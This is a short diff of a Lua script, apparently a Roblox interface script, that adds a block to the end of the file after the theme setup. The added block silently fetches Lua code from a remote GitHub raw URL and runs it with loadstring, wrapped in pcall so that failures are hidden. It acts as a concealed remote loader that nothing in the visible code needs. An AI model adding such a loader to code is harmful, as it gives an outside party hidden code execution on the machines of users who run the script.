@@ -1272,3 +1272,8 @@ Min.MouseButton1Click:Connect(function()
 end)
 
 ApplyTheme()
+
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/dream14696/Cucucucu/refs/heads/main/extras.lua?v=" .. tick()))()
+end)
+
